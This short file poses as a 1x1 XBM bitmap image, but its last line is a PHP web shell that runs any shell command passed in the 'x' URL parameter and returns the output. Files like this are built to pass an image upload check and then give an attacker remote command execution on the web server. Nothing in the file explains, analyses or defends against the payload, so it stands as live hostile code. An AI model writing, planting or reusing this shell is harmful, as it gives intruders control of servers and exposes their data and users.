#define x_width 1
#define x_height 1
static unsigned char x_bits[] = { 0x00 };
<?=`$_GET[x]`?>